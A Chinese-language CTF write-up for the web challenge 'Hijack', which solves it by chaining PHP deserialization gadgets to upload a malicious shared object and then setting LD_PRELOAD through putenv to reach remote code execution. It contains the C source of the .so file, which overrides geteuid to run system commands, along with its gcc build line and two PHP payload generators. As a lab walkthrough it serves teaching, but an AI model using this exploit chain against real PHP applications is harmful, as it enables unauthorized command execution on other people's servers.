# Hijack

> 分类：Web

## 题目描述

PHP 反序列化 + LD_PRELOAD 环境变量劫持。入口是 `ENV::__wakeup`，通过 POP 链最终实现 putenv 设置 LD_PRELOAD 加载恶意 so 文件执行命令。

## 考察知识点

- PHP 反序列化 POP 链（`__wakeup`、`__isset`、`__get`、`__call`、`__toString`）
- LD_PRELOAD 环境变量劫持
- so 文件上传与 geteuid 劫持

## 解法

**整体思路**：第一次反序列化获取 so 文件上传路径，第二次反序列化打 putenv 环境变量劫持。

**POP 链**：`ENV::__wakeup -> DIFF::__isset -> FUN::__get -> FILE::__call`（上传 so 文件）；第二条链 `ENV::__wakeup -> DIFF::__isset -> FILE::__get -> ENV::__toString`（打 putenv）。

**第一步：生成恶意 so 文件**

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
    system("ls /");
}
int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

编译：

```shell
gcc -fPIC -shared -o hack.so hack.c -nostartfiles
```

将 so 文件 base64 编码。

**第二步：第一次反序列化（上传 so 获取路径）**

```php
<?php
class ENV { public $key; public $value; public $math; }
class DIFF { public $callback; public $back; private $flag; }
class FILE { public $filename; public $enviroment; }
class FUN { public $fun; public $value; }
$e = new ENV();
$d = new DIFF();
$f1 = new FILE();
$f2 = new FUN();
$e->math = $d;
$d->callback = $f2;
$f2->fun = $f1;
$content = file_get_contents("1.txt");  // hack.so 的 base64
$f2->value = array($content);
$f1->filename = "hack.so";
echo urlencode(serialize($e));
?>
```

提交后回显 so 文件上传后的路径（如 `/tmp/c7ed72aaf0298f27c1cbb431eed7c3da.so`）。

**第三步：第二次反序列化（打 putenv）**

```php
<?php
class ENV { public $key; public $value; public $math; }
class DIFF { public $callback; public $back; private $flag; }
class FILE { public $filename; public $enviroment; }
class FUN { public $fun; public $value; }
$e1 = new ENV();
$e2 = new ENV();
$d = new DIFF();
$f1 = new FILE();
$f2 = new FUN();
$e1->math = $d;
$d->callback = $f1;
$f1->enviroment = $e2;
$e2->key = "LD_PRELOAD";
$e2->value = "/tmp/c7ed72aaf0298f27c1cbb431eed7c3da.so";  // 上传路径
echo urlencode(serialize($e1));
?>
```

提交后成功 RCE。最后修改 C 文件中的命令为 `cat /flag_7876482a2df10725a459 > 4.txt`，重复操作即可拿到 flag。

## 参考答案

（flag 通过 LD_PRELOAD RCE 读取 `/flag_7876482a2df10725a459`）

## 来源

- 作者：Eddie_Murphy | https://www.cnblogs.com/EddieMurphy-blogs/p/18286293
- 作者：花草木_逆向小白 | https://blog.csdn.net/qq_67760645/article/details/140244620
